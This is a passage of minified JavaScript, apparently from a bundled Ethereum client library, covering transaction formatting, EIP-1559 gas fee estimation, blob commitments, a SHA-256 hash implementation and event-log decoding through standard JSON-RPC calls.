        maxPriorityFeePerGas: r
    })
}
class sg extends F {
    constructor() {
        super("`baseFeeMultiplier` must be greater than 1.", {
            name: "BaseFeeScalarError"
        })
    }
}
class zf extends F {
    constructor() {
        super("Chain does not support EIP-1559 fees.", {
            name: "Eip1559FeesNotSupportedError"
        })
    }
}
class W4 extends F {
    constructor({
        maxPriorityFeePerGas: t
    }) {
        super(`\`maxFeePerGas\` cannot be less than the \`maxPriorityFeePerGas\` (${Et(t)} gwei).`, {
            name: "MaxFeePerGasTooLowError"
        })
    }
}
class ig extends F {
    constructor({
        blockHash: t,
        blockNumber: n
    }) {
        let r = "Block";
        t && (r = `Block at hash "${t}"`), n && (r = `Block at number "${n}"`), super(`${r} could not be found.`, {
            name: "BlockNotFoundError"
        })
    }
}
const og = {
    "0x0": "legacy",
    "0x1": "eip2930",
    "0x2": "eip1559",
    "0x3": "eip4844",
    "0x4": "eip7702"
};

function qf(e, t) {
    const n = {
        ...e,
        blockHash: e.blockHash ? e.blockHash : null,
        blockNumber: e.blockNumber ? BigInt(e.blockNumber) : null,
        chainId: e.chainId ? Qt(e.chainId) : void 0,
        gas: e.gas ? BigInt(e.gas) : void 0,
        gasPrice: e.gasPrice ? BigInt(e.gasPrice) : void 0,
        maxFeePerBlobGas: e.maxFeePerBlobGas ? BigInt(e.maxFeePerBlobGas) : void 0,
        maxFeePerGas: e.maxFeePerGas ? BigInt(e.maxFeePerGas) : void 0,
        maxPriorityFeePerGas: e.maxPriorityFeePerGas ? BigInt(e.maxPriorityFeePerGas) : void 0,
        nonce: e.nonce ? Qt(e.nonce) : void 0,
        to: e.to ? e.to : null,
        transactionIndex: e.transactionIndex ? Number(e.transactionIndex) : null,
        type: e.type ? og[e.type] : void 0,
        typeHex: e.type ? e.type : void 0,
        value: e.value ? BigInt(e.value) : void 0,
        v: e.v ? BigInt(e.v) : void 0
    };
    return e.authorizationList && (n.authorizationList = X4(e.authorizationList)), n.yParity = (() => {
        if (e.yParity) return Number(e.yParity);
        if (typeof n.v == "bigint") {
            if (n.v === 0n || n.v === 27n) return 0;
            if (n.v === 1n || n.v === 28n) return 1;
            if (n.v >= 35n) return n.v % 2n === 0n ? 1 : 0
        }
    })(), n.type === "legacy" && (delete n.accessList, delete n.maxFeePerBlobGas, delete n.maxFeePerGas, delete n.maxPriorityFeePerGas, delete n.yParity), n.type === "eip2930" && (delete n.maxFeePerBlobGas, delete n.maxFeePerGas, delete n.maxPriorityFeePerGas), n.type === "eip1559" && delete n.maxFeePerBlobGas, n
}

function X4(e) {
    return e.map(t => ({
        address: t.address,
        chainId: Number(t.chainId),
        nonce: Number(t.nonce),
        r: t.r,
        s: t.s,
        yParity: Number(t.yParity)
    }))
}

function ag(e, t) {
    const n = (e.transactions ?? []).map(r => typeof r == "string" ? r : qf(r));
    return {
        ...e,
        baseFeePerGas: e.baseFeePerGas ? BigInt(e.baseFeePerGas) : null,
        blobGasUsed: e.blobGasUsed ? BigInt(e.blobGasUsed) : void 0,
        difficulty: e.difficulty ? BigInt(e.difficulty) : void 0,
        excessBlobGas: e.excessBlobGas ? BigInt(e.excessBlobGas) : void 0,
        gasLimit: e.gasLimit ? BigInt(e.gasLimit) : void 0,
        gasUsed: e.gasUsed ? BigInt(e.gasUsed) : void 0,
        hash: e.hash ? e.hash : null,
        logsBloom: e.logsBloom ? e.logsBloom : null,
        nonce: e.nonce ? e.nonce : null,
        number: e.number ? BigInt(e.number) : null,
        size: e.size ? BigInt(e.size) : void 0,
        timestamp: e.timestamp ? BigInt(e.timestamp) : void 0,
        transactions: n,
        totalDifficulty: e.totalDifficulty ? BigInt(e.totalDifficulty) : null
    }
}
async function Kt(e, {
    blockHash: t,
    blockNumber: n,
    blockTag: r = e.experimental_blockTag ?? "latest",
    includeTransactions: s
} = {}) {
    const i = s ?? !1,
        o = n !== void 0 ? J(n) : void 0;
    let a = null;
    if (t ? a = await e.request({
            method: "eth_getBlockByHash",
            params: [t, i]
        }, {
            dedupe: !0
        }) : a = await e.request({
            method: "eth_getBlockByNumber",
            params: [o || r, i]
        }, {
            dedupe: !!o
        }), !a) throw new ig({
        blockHash: t,
        blockNumber: n
    });
    return (e.chain?.formatters?.block?.format || ag)(a, "getBlock")
}
async function Gf(e) {
    const t = await e.request({
        method: "eth_gasPrice"
    });
    return BigInt(t)
}
async function K4(e, t) {
    return cg(e, t)
}
async function cg(e, t) {
    const {
        block: n,
        chain: r = e.chain,
        request: s
    } = t || {};
    try {
        const i = r?.fees?.maxPriorityFeePerGas ?? r?.fees?.defaultPriorityFee;
        if (typeof i == "function") {
            const a = n || await Y(e, Kt, "getBlock")({}),
                c = await i({
                    block: a,
                    client: e,
                    request: s
                });
            if (c === null) throw new Error;
            return c
        }
        if (typeof i < "u") return i;
        const o = await e.request({
            method: "eth_maxPriorityFeePerGas"
        });
        return Mt(o)
    } catch {
        const [i, o] = await Promise.all([n ? Promise.resolve(n) : Y(e, Kt, "getBlock")({}), Y(e, Gf, "getGasPrice")({})]);
        if (typeof i.baseFeePerGas != "bigint") throw new zf;
        const a = o - i.baseFeePerGas;
        return a < 0n ? 0n : a
    }
}
async function Z4(e, t) {
    return t0(e, t)
}
async function t0(e, t) {
    const {
        block: n,
        chain: r = e.chain,
        request: s,
        type: i = "eip1559"
    } = t || {}, o = await (async () => typeof r?.fees?.baseFeeMultiplier == "function" ? r.fees.baseFeeMultiplier({
        block: n,
        client: e,
        request: s
    }) : r?.fees?.baseFeeMultiplier ?? 1.2)();
    if (o < 1) throw new sg;
    const c = 10 ** (o.toString().split(".")[1]?.length ?? 0),
        u = d => d * BigInt(Math.ceil(o * c)) / BigInt(c),
        l = n || await Y(e, Kt, "getBlock")({});
    if (typeof r?.fees?.estimateFeesPerGas == "function") {
        const d = await r.fees.estimateFeesPerGas({
            block: n,
            client: e,
            multiply: u,
            request: s,
            type: i
        });
        if (d !== null) return d
    }
    if (i === "eip1559") {
        if (typeof l.baseFeePerGas != "bigint") throw new zf;
        const d = typeof s?.maxPriorityFeePerGas == "bigint" ? s.maxPriorityFeePerGas : await cg(e, {
                block: l,
                chain: r,
                request: s
            }),
            h = u(l.baseFeePerGas);
        return {
            maxFeePerGas: s?.maxFeePerGas ?? h + d,
            maxPriorityFeePerGas: d
        }
    }
    return {
        gasPrice: s?.gasPrice ?? u(await Y(e, Gf, "getGasPrice")({}))
    }
}
async function Wf(e, {
    address: t,
    blockTag: n = "latest",
    blockNumber: r
}) {
    const s = await e.request({
        method: "eth_getTransactionCount",
        params: [t, typeof r == "bigint" ? J(r) : n]
    }, {
        dedupe: !!r
    });
    return Qt(s)
}

function lg(e) {
    const {
        kzg: t
    } = e, n = e.to ?? (typeof e.blobs[0] == "string" ? "hex" : "bytes"), r = typeof e.blobs[0] == "string" ? e.blobs.map(i => gn(i)) : e.blobs, s = [];
    for (const i of r) s.push(Uint8Array.from(t.blobToKzgCommitment(i)));
    return n === "bytes" ? s : s.map(i => Le(i))
}

function ug(e) {
    const {
        kzg: t
    } = e, n = e.to ?? (typeof e.blobs[0] == "string" ? "hex" : "bytes"), r = typeof e.blobs[0] == "string" ? e.blobs.map(o => gn(o)) : e.blobs, s = typeof e.commitments[0] == "string" ? e.commitments.map(o => gn(o)) : e.commitments, i = [];
    for (let o = 0; o < r.length; o++) {
        const a = r[o],
            c = s[o];
        i.push(Uint8Array.from(t.computeBlobKzgProof(a, c)))
    }
    return n === "bytes" ? i : i.map(o => Le(o))
}

function Y4(e, t, n, r) {
    if (typeof e.setBigUint64 == "function") return e.setBigUint64(t, n, r);
    const s = BigInt(32),
        i = BigInt(4294967295),
        o = Number(n >> s & i),
        a = Number(n & i),
        c = r ? 4 : 0,
        u = r ? 0 : 4;
    e.setUint32(t + c, o, r), e.setUint32(t + u, a, r)
}

function J4(e, t, n) {
    return e & t ^ ~e & n
}

function Q4(e, t, n) {
    return e & t ^ e & n ^ t & n
}
class ev extends kf {
    constructor(t, n, r, s) {
        super(), this.finished = !1, this.length = 0, this.pos = 0, this.destroyed = !1, this.blockLen = t, this.outputLen = n, this.padOffset = r, this.isLE = s, this.buffer = new Uint8Array(t), this.view = Wl(this.buffer)
    }
    update(t) {
        Js(this), t = ul(t), ss(t);
        const {
            view: n,
            buffer: r,
            blockLen: s
        } = this, i = t.length;
        for (let o = 0; o < i;) {
            const a = Math.min(s - this.pos, i - o);
            if (a === s) {
                const c = Wl(t);
                for (; s <= i - o; o += s) this.process(c, o);
                continue
            }
            r.set(t.subarray(o, o + a), this.pos), this.pos += a, o += a, this.pos === s && (this.process(n, 0), this.pos = 0)
        }
        return this.length += t.length, this.roundClean(), this
    }
    digestInto(t) {
        Js(this), Nb(t, this), this.finished = !0;
        const {
            buffer: n,
            view: r,
            blockLen: s,
            isLE: i
        } = this;
        let {
            pos: o
        } = this;
        n[o++] = 128, Qs(this.buffer.subarray(o)), this.padOffset > s - o && (this.process(r, 0), o = 0);
        for (let f = o; f < s; f++) n[f] = 0;
        Y4(r, s - 8, BigInt(this.length * 8), i), this.process(r, 0);
        const a = Wl(t),
            c = this.outputLen;
        if (c % 4) throw new Error("_sha2: outputLen should be aligned to 32bit");
        const u = c / 4,
            l = this.get();
        if (u > l.length) throw new Error("_sha2: outputLen bigger than state");
        for (let f = 0; f < u; f++) a.setUint32(4 * f, l[f], i)
    }
    digest() {
        const {
            buffer: t,
            outputLen: n
        } = this;
        this.digestInto(t);
        const r = t.slice(0, n);
        return this.destroy(), r
    }
    _cloneInto(t) {
        t || (t = new this.constructor), t.set(...this.get());
        const {
            blockLen: n,
            buffer: r,
            length: s,
            finished: i,
            destroyed: o,
            pos: a
        } = this;
        return t.destroyed = o, t.finished = i, t.length = s, t.pos = a, s % n && t.buffer.set(r), t
    }
    clone() {
        return this._cloneInto()
    }
}
const ir = Uint32Array.from([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225]),
    tv = Uint32Array.from([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298]),
    or = new Uint32Array(64);
class nv extends ev {
    constructor(t = 32) {
        super(64, t, 8, !1), this.A = ir[0] | 0, this.B = ir[1] | 0, this.C = ir[2] | 0, this.D = ir[3] | 0, this.E = ir[4] | 0, this.F = ir[5] | 0, this.G = ir[6] | 0, this.H = ir[7] | 0
    }
    get() {
        const {
            A: t,
            B: n,
            C: r,
            D: s,
            E: i,
            F: o,
            G: a,
            H: c
        } = this;
        return [t, n, r, s, i, o, a, c]
    }
    set(t, n, r, s, i, o, a, c) {
        this.A = t | 0, this.B = n | 0, this.C = r | 0, this.D = s | 0, this.E = i | 0, this.F = o | 0, this.G = a | 0, this.H = c | 0
    }
    process(t, n) {
        for (let f = 0; f < 16; f++, n += 4) or[f] = t.getUint32(n, !1);
        for (let f = 16; f < 64; f++) {
            const d = or[f - 15],
                h = or[f - 2],
                b = an(d, 7) ^ an(d, 18) ^ d >>> 3,
                m = an(h, 17) ^ an(h, 19) ^ h >>> 10;
            or[f] = m + or[f - 7] + b + or[f - 16] | 0
        }
        let {
            A: r,
            B: s,
            C: i,
            D: o,
            E: a,
            F: c,
            G: u,
            H: l
        } = this;
        for (let f = 0; f < 64; f++) {
            const d = an(a, 6) ^ an(a, 11) ^ an(a, 25),
                h = l + d + J4(a, c, u) + tv[f] + or[f] | 0,
                m = (an(r, 2) ^ an(r, 13) ^ an(r, 22)) + Q4(r, s, i) | 0;
            l = u, u = c, c = a, a = o + h | 0, o = i, i = s, s = r, r = h + m | 0
        }
        r = r + this.A | 0, s = s + this.B | 0, i = i + this.C | 0, o = o + this.D | 0, a = a + this.E | 0, c = c + this.F | 0, u = u + this.G | 0, l = l + this.H | 0, this.set(r, s, i, o, a, c, u, l)
    }
    roundClean() {
        Qs(or)
    }
    destroy() {
        this.set(0, 0, 0, 0, 0, 0, 0, 0), Qs(this.buffer)
    }
}
const fg = Pb(() => new nv),
    rv = fg;

function sv(e, t) {
    return rv(bn(e, {
        strict: !1
    }) ? fi(e) : e)
}

function iv(e) {
    const {
        commitment: t,
        version: n = 1
    } = e, r = e.to ?? (typeof t == "string" ? "hex" : "bytes"), s = sv(t);
    return s.set([n], 0), r === "bytes" ? s : Le(s)
}

function ov(e) {
    const {
        commitments: t,
        version: n
    } = e, r = e.to, s = [];
    for (const i of t) s.push(iv({
        commitment: i,
        to: r,
        version: n
    }));
    return s
}
const ap = 6,
    dg = 32,
    Xf = 4096,
    hg = dg * Xf,
    cp = hg * ap - 1 - 1 * Xf * ap;
class av extends F {
    constructor({
        maxSize: t,
        size: n
    }) {
        super("Blob size is too large.", {
            metaMessages: [`Max: ${t} bytes`, `Given: ${n} bytes`],
            name: "BlobSizeTooLargeError"
        })
    }
}
class cv extends F {
    constructor() {
        super("Blob data must not be empty.", {
            name: "EmptyBlobError"
        })
    }
}

function lv(e) {
    const t = typeof e.data == "string" ? gn(e.data) : e.data,
        n = Ie(t);
    if (!n) throw new cv;
    if (n > cp) throw new av({
        maxSize: cp,
        size: n
    });
    const r = [];
    let s = !0,
        i = 0;
    for (; s;) {
        const o = Uf(new Uint8Array(hg));
        let a = 0;
        for (; a < Xf;) {
            const c = t.slice(i, i + (dg - 1));
            if (o.pushByte(0), o.pushBytes(c), c.length < 31) {
                o.pushByte(128), s = !1;
                break
            }
            a++, i += 31
        }
        r.push(o)
    }
    return r.map(o => Le(o.bytes))
}

function uv(e) {
    const {
        data: t,
        kzg: n,
        to: r
    } = e, s = e.blobs ?? lv({
        data: t
    }), i = e.commitments ?? lg({
        blobs: s,
        kzg: n,
        to: r
    }), o = e.proofs ?? ug({
        blobs: s,
        commitments: i,
        kzg: n,
        to: r
    }), a = [];
    for (let c = 0; c < s.length; c++) a.push({
        blob: s[c],
        commitment: i[c],
        proof: o[c]
    });
    return a
}

function fv(e) {
    if (e.type) return e.type;
    if (typeof e.authorizationList < "u") return "eip7702";
    if (typeof e.blobs < "u" || typeof e.blobVersionedHashes < "u" || typeof e.maxFeePerBlobGas < "u" || typeof e.sidecars < "u") return "eip4844";
    if (typeof e.maxFeePerGas < "u" || typeof e.maxPriorityFeePerGas < "u") return "eip1559";
    if (typeof e.gasPrice < "u") return typeof e.accessList < "u" ? "eip2930" : "legacy";
    throw new S4({
        transaction: e
    })
}

function bl(e, {
    docsPath: t,
    ...n
}) {
    const r = (() => {
        const s = ml(e, n);
        return s instanceof ea ? e : s
    })();
    return new C4(r, {
        docsPath: t,
        ...n
    })
}
async function Ir(e) {
    const t = await e.request({
        method: "eth_chainId"
    }, {
        dedupe: !0
    });
    return Qt(t)
}
async function Kf(e, t) {
    const {
        account: n = e.account,
        accessList: r,
        authorizationList: s,
        chain: i = e.chain,
        blobVersionedHashes: o,
        blobs: a,
        data: c,
        gas: u,
        gasPrice: l,
        maxFeePerBlobGas: f,
        maxFeePerGas: d,
        maxPriorityFeePerGas: h,
        nonce: b,
        nonceManager: m,
        to: _,
        type: E,
        value: S,
        ...g
    } = t, p = await (async () => {
        if (!n || !m || typeof b < "u") return b;
        const v = Se(n),
            y = i ? i.id : await Y(e, Ir, "getChainId")({});
        return await m.consume({
            address: v.address,
            chainId: y,
            client: e
        })
    })();
    nr(t);
    const w = i?.formatters?.transactionRequest?.format,
        N = (w || Cr)({
            ...pi(g, {
                format: w
            }),
            account: n ? Se(n) : void 0,
            accessList: r,
            authorizationList: s,
            blobs: a,
            blobVersionedHashes: o,
            data: c,
            gas: u,
            gasPrice: l,
            maxFeePerBlobGas: f,
            maxFeePerGas: d,
            maxPriorityFeePerGas: h,
            nonce: p,
            to: _,
            type: E,
            value: S
        }, "fillTransaction");
    try {
        const v = await e.request({
                method: "eth_fillTransaction",
                params: [N]
            }),
            x = (i?.formatters?.transaction?.format || qf)(v.tx);
        delete x.blockHash, delete x.blockNumber, delete x.r, delete x.s, delete x.transactionIndex, delete x.v, delete x.yParity, x.data = x.input, x.gas && (x.gas = t.gas ?? x.gas), x.gasPrice && (x.gasPrice = t.gasPrice ?? x.gasPrice), x.maxFeePerBlobGas && (x.maxFeePerBlobGas = t.maxFeePerBlobGas ?? x.maxFeePerBlobGas), x.maxFeePerGas && (x.maxFeePerGas = t.maxFeePerGas ?? x.maxFeePerGas), x.maxPriorityFeePerGas && (x.maxPriorityFeePerGas = t.maxPriorityFeePerGas ?? x.maxPriorityFeePerGas), x.nonce && (x.nonce = t.nonce ?? x.nonce);
        const I = await (async () => {
            if (typeof i?.fees?.baseFeeMultiplier == "function") {
                const k = await Y(e, Kt, "getBlock")({});
                return i.fees.baseFeeMultiplier({
                    block: k,
                    client: e,
                    request: t
                })
            }
            return i?.fees?.baseFeeMultiplier ?? 1.2
        })();
        if (I < 1) throw new sg;
        const O = 10 ** (I.toString().split(".")[1]?.length ?? 0),
            L = k => k * BigInt(Math.ceil(I * O)) / BigInt(O);
        return x.maxFeePerGas && !t.maxFeePerGas && (x.maxFeePerGas = L(x.maxFeePerGas)), x.gasPrice && !t.gasPrice && (x.gasPrice = L(x.gasPrice)), {
            raw: v.raw,
            transaction: {
                from: N.from,
                ...x
            }
        }
    } catch (v) {
        throw bl(v, {
            ...t,
            chain: e.chain
        })
    }
}
const Zf = ["blobVersionedHashes", "chainId", "fees", "gas", "nonce", "type"],
    lp = new Map,
    Zl = new di(128);
async function ta(e, t) {
    const {
        account: n = e.account,
        chain: r,
        nonceManager: s,
        parameters: i = Zf
    } = t;
    let o;
    async function a() {
        return o || (r ? r.id : typeof t.chainId < "u" ? t.chainId : (o = await Y(e, Ir, "getChainId")({}), o))
    }
    const c = n && Se(n);
    let u = t.nonce;
    if (i.includes("nonce") && typeof u > "u" && c && s) {
        const g = await a();
        u = await s.consume({
            address: c.address,
            chainId: g,
            client: e
        })
    }
    const f = Zl.get(e.uid) !== !1 && ["fees", "gas"].some(g => t.parameters?.includes(g)) ? await Y(e, Kf, "fillTransaction")({
            ...t,
            nonce: u
        }).then(g => {
            const {
                chainId: p,
                from: w,
                gas: A,
                gasPrice: N,
                nonce: v,
                maxFeePerBlobGas: y,
                maxFeePerGas: x,
                maxPriorityFeePerGas: I,
                type: T
            } = g.transaction;
            return Zl.set(e.uid, !0), {
                ...t,
                ...p ? {
                    chainId: p
                } : {},
                ...w ? {
                    from: w
                } : {},
                ...A ? {
                    gas: A
                } : {},
                ...N ? {
                    gasPrice: N
                } : {},
                ...v ? {
                    nonce: v
                } : {},
                ...y ? {
                    maxFeePerBlobGas: y
                } : {},
                ...x ? {
                    maxFeePerGas: x
                } : {},
                ...I ? {
                    maxPriorityFeePerGas: I
                } : {},
                ...T ? {
                    type: T
                } : {}
            }
        }).catch(g => (g.walk(A => {
            const N = A;
            return N.name === "MethodNotFoundRpcError" || N.name === "MethodNotSupportedRpcError"
        }) && Zl.set(e.uid, !1), t)) : t,
        {
            blobs: d,
            gas: h,
            kzg: b,
            type: m
        } = f;
    u ??= f.nonce;
    const _ = {
        ...f,
        ...c ? {
            from: c?.address
        } : {},
        ...u ? {
            nonce: u
        } : {}
    };
    let E;
    async function S() {
        return E || (E = await Y(e, Kt, "getBlock")({
            blockTag: "latest"
        }), E)
    }
    if (i.includes("nonce") && typeof u > "u" && c && !s && (_.nonce = await Y(e, Wf, "getTransactionCount")({
            address: c.address,
            blockTag: "pending"
        })), (i.includes("blobVersionedHashes") || i.includes("sidecars")) && d && b) {
        const g = lg({
            blobs: d,
            kzg: b
        });
        if (i.includes("blobVersionedHashes")) {
            const p = ov({
                commitments: g,
                to: "hex"
            });
            _.blobVersionedHashes = p
        }
        if (i.includes("sidecars")) {
            const p = ug({
                    blobs: d,
                    commitments: g,
                    kzg: b
                }),
                w = uv({
                    blobs: d,
                    commitments: g,
                    proofs: p,
                    to: "hex"
                });
            _.sidecars = w
        }
    }
    if (i.includes("chainId") && (_.chainId = await a()), (i.includes("fees") || i.includes("type")) && typeof m > "u") try {
        _.type = fv(_)
    } catch {
        let g = lp.get(e.uid);
        typeof g > "u" && (g = typeof(await S())?.baseFeePerGas == "bigint", lp.set(e.uid, g)), _.type = g ? "eip1559" : "legacy"
    }
    if (i.includes("fees"))
        if (_.type !== "legacy" && _.type !== "eip2930") {
            if (typeof _.maxFeePerGas > "u" || typeof _.maxPriorityFeePerGas > "u") {
                const g = await S(),
                    {
                        maxFeePerGas: p,
                        maxPriorityFeePerGas: w
                    } = await t0(e, {
                        block: g,
                        chain: r,
                        request: _
                    });
                if (typeof _.maxPriorityFeePerGas > "u" && _.maxFeePerGas && _.maxFeePerGas < w) throw new W4({
                    maxPriorityFeePerGas: w
                });
                _.maxPriorityFeePerGas = w, _.maxFeePerGas = p
            }
        } else {
            if (typeof _.maxFeePerGas < "u" || typeof _.maxPriorityFeePerGas < "u") throw new zf;
            if (typeof _.gasPrice > "u") {
                const g = await S(),
                    {
                        gasPrice: p
                    } = await t0(e, {
                        block: g,
                        chain: r,
                        request: _,
                        type: "legacy"
                    });
                _.gasPrice = p
            }
        } return i.includes("gas") && typeof h > "u" && (_.gas = await Y(e, Yf, "estimateGas")({
        ..._,
        account: c,
        prepare: c?.type === "local" ? [] : ["blobVersionedHashes"]
    })), nr(_), delete _.parameters, _
}
async function Yf(e, t) {
    const {
        account: n = e.account,
        prepare: r = !0
    } = t, s = n ? Se(n) : void 0, i = (() => {
        if (Array.isArray(r)) return r;
        if (s?.type !== "local") return ["blobVersionedHashes"]
    })();
    try {
        const {
            accessList: o,
            authorizationList: a,
            blobs: c,
            blobVersionedHashes: u,
            blockNumber: l,
            blockTag: f,
            data: d,
            gas: h,
            gasPrice: b,
            maxFeePerBlobGas: m,
            maxFeePerGas: _,
            maxPriorityFeePerGas: E,
            nonce: S,
            value: g,
            stateOverride: p,
            ...w
        } = r ? await ta(e, {
            ...t,
            parameters: i
        }) : t, N = (typeof l == "bigint" ? J(l) : void 0) || f, v = jf(p), y = await (async () => {
            if (w.to) return w.to;
            if (a && a.length > 0) return await pl({
                authorization: a[0]
            }).catch(() => {
                throw new F("`to` is required. Could not infer from `authorizationList`")
            })
        })();
        nr(t);
        const x = e.chain?.formatters?.transactionRequest?.format,
            T = (x || Cr)({
                ...pi(w, {
                    format: x
                }),
                account: s,
                accessList: o,
                authorizationList: a,
                blobs: c,
                blobVersionedHashes: u,
                data: d,
                gas: h,
                gasPrice: b,
                maxFeePerBlobGas: m,
                maxFeePerGas: _,
                maxPriorityFeePerGas: E,
                nonce: S,
                to: y,
                value: g
            }, "estimateGas");
        return BigInt(await e.request({
            method: "eth_estimateGas",
            params: v ? [T, N ?? e.experimental_blockTag ?? "latest", v] : N ? [T, N] : [T]
        }))
    } catch (o) {
        throw j4(o, {
            ...t,
            account: s,
            chain: e.chain
        })
    }
}
async function dv(e, t) {
    const {
        abi: n,
        address: r,
        args: s,
        functionName: i,
        dataSuffix: o,
        ...a
    } = t, c = Bt({
        abi: n,
        args: s,
        functionName: i
    });
    try {
        return await Y(e, Yf, "estimateGas")({
            data: `${c}${o?o.replace("0x",""):""}`,
            to: r,
            ...a
        })
    } catch (u) {
        const l = a.account ? Se(a.account) : void 0;
        throw os(u, {
            abi: n,
            address: r,
            args: s,
            docsPath: "/docs/contract/estimateContractGas",
            functionName: i,
            sender: l?.address
        })
    }
}

function na(e, t) {
    if (!zt(e, {
            strict: !1
        })) throw new _r({
        address: e
    });
    if (!zt(t, {
            strict: !1
        })) throw new _r({
        address: t
    });
    return e.toLowerCase() === t.toLowerCase()
}
const up = "/docs/contract/decodeEventLog";

function Jf(e) {
    const {
        abi: t,
        data: n,
        strict: r,
        topics: s
    } = e, i = r ?? !0, [o, ...a] = s;
    if (!o) throw new nE({
        docsPath: up
    });
    const c = t.find(m => m.type === "event" && o === fl(Jt(m)));
    if (!(c && "name" in c) || c.type !== "event") throw new Eb(o, {
        docsPath: up
    });
    const {
        name: u,
        inputs: l
    } = c, f = l?.some(m => !("name" in m && m.name)), d = f ? [] : {}, h = l.map((m, _) => [m, _]).filter(([m]) => "indexed" in m && m.indexed);
    for (let m = 0; m < h.length; m++) {
        const [_, E] = h[m], S = a[m];
        if (!S) throw new ll({
            abiItem: c,
            param: _
        });
        d[f ? E : _.name || E] = hv({
            param: _,
            value: S
        })
    }
    const b = l.filter(m => !("indexed" in m && m.indexed));
    if (b.length > 0) {
        if (n && n !== "0x") try {
            const m = Jo(b, n);
            if (m)
                if (f)
                    for (let _ = 0; _ < l.length; _++) d[_] = d[_] ?? m.shift();
                else
                    for (let _ = 0; _ < b.length; _++) d[b[_].name] = m[_]
        } catch (m) {
            if (i) throw m instanceof wb || m instanceof zb ? new oo({
                abiItem: c,
                data: n,
                params: b,
                size: Ie(n)
            }) : m
        } else if (i) throw new oo({
            abiItem: c,
            data: "0x",
            params: b,
            size: 0
        })
    }
    return {
        eventName: u,
        args: Object.values(d).length > 0 ? d : void 0
    }
}

function hv({
    param: e,
    value: t
}) {
    return e.type === "string" || e.type === "bytes" || e.type === "tuple" || e.type.match(/^(.*)\[(\d+)?\]$/) ? t : (Jo([e], t) || [])[0]
}

function Qf(e) {
    const {
        abi: t,
        args: n,
        logs: r,
        strict: s = !0
    } = e, i = (() => {
        if (e.eventName) return Array.isArray(e.eventName) ? e.eventName : [e.eventName]
    })();
    return r.map(o => {
        try {
            const a = t.find(u => u.type === "event" && o.topics[0] === fl(u));
            if (!a) return null;
            const c = Jf({
                ...o,
                abi: [a],
                strict: s
            });
            return i && !i.includes(c.eventName) || !pv({
                args: c.args,
                inputs: a.inputs,
                matchArgs: n
            }) ? null : {
                ...c,
                ...o
            }
        } catch (a) {
            let c, u;
            if (a instanceof Eb) return null;
            if (a instanceof oo || a instanceof ll) {
                if (s) return null;
                c = a.abiItem.name, u = a.abiItem.inputs?.some(l => !("name" in l && l.name))
            }
            return {
                ...o,
                args: u ? [] : {},
                eventName: c
            }
        }
    }).filter(Boolean)
}

function pv(e) {
    const {
        args: t,
        inputs: n,
        matchArgs: r
    } = e;
    if (!r) return !0;
    if (!t) return !1;

    function s(i, o, a) {
        try {
            return i.type === "address" ? na(o, a) : i.type === "string" || i.type === "bytes" ? We(fi(o)) === a : o === a
        } catch {
            return !1
        }
    }
    return Array.isArray(t) && Array.isArray(r) ? r.every((i, o) => {
        if (i == null) return !0;
        const a = n[o];
        return a ? (Array.isArray(i) ? i : [i]).some(u => s(a, u, t[o])) : !1
    }) : typeof t == "object" && !Array.isArray(t) && typeof r == "object" && !Array.isArray(r) ? Object.entries(r).every(([i, o]) => {
        if (o == null) return !0;
        const a = n.find(u => u.name === i);
        return a ? (Array.isArray(o) ? o : [o]).some(u => s(a, u, t[i])) : !1
    }) : !1
}

function Zn(e, {
    args: t,
    eventName: n
} = {}) {
    return {
        ...e,
        blockHash: e.blockHash ? e.blockHash : null,
        blockNumber: e.blockNumber ? BigInt(e.blockNumber) : null,
        logIndex: e.logIndex ? Number(e.logIndex) : null,
        transactionHash: e.transactionHash ? e.transactionHash : null,
        transactionIndex: e.transactionIndex ? Number(e.transactionIndex) : null,
        ...n ? {
            args: t,
            eventName: n
        } : {}
    }
}
async function ed(e, {
    address: t,
    blockHash: n,
    fromBlock: r,
    toBlock: s,
    event: i,
    events: o,
    args: a,
    strict: c
} = {}) {
    const u = c ?? !1,
        l = o ?? (i ? [i] : void 0);
    let f = [];
    l && (f = [l.flatMap(m => Yo({
        abi: [m],
        eventName: m.name,
        args: o ? void 0 : a
    }))], i && (f = f[0]));
    let d;
    n ? d = await e.request({
        method: "eth_getLogs",
        params: [{
            address: t,
            topics: f,
            blockHash: n
        }]
    }) : d = await e.request({
        method: "eth_getLogs",
        params: [{
            address: t,
            topics: f,
            fromBlock: typeof r == "bigint" ? J(r) : r,
            toBlock: typeof s == "bigint" ? J(s) : s
        }]
    });
    const h = d.map(b => Zn(b));
    return l ? Qf({
        abi: l,
        args: a,
        logs: h,
        strict: u
    }) : h
}
async function pg(e, t) {
    const {
        abi: n,
        address: r,
        args: s,
        blockHash: i,
        eventName: o,
        fromBlock: a,
        toBlock: c,
        strict: u
    } = t, l = o ? ps({
        abi: n,
        name: o
    }) : void 0, f = l ? void 0 : n.filter(d => d.type === "event");
    return Y(e, ed, "getLogs")({
        address: r,
        args: s,
        blockHash: i,
        event: l,
        events: f,
        fromBlock: a,
        toBlock: c,
        strict: u
    })
}
const Yl = "/docs/contract/decodeFunctionResult";

function ms(e) {
    const {
        abi: t,
        args: n,
        functionName: r,
        data: s
    } = e;
    let i = t[0];
    if (r) {
        const a = ps({
            abi: t,
            args: n,
            name: r
        });
        if (!a) throw new Zs(r, {
            docsPath: Yl
        });
        i = a
    }
    if (i.type !== "function") throw new Zs(void 0, {
        docsPath: Yl
    });
    if (!i.outputs) throw new vb(i.name, {
        docsPath: Yl
    });
    const o = Jo(i.outputs, s);
    if (o && o.length > 1) return o;
    if (o && o.length === 1) return o[0]
}
const td = BigInt(0),
    n0 = BigInt(1);

function ra(e) {
    return e instanceof Uint8Array || ArrayBuffer.isView(e) && e.constructor.name === "Uint8Array"
}

function nd(e) {
    if (!ra(e)) throw new Error("Uint8Array expected")
}

function Ao(e, t) {
    if (typeof t != "boolean") throw new Error(e + " boolean expected, got " + t)
}
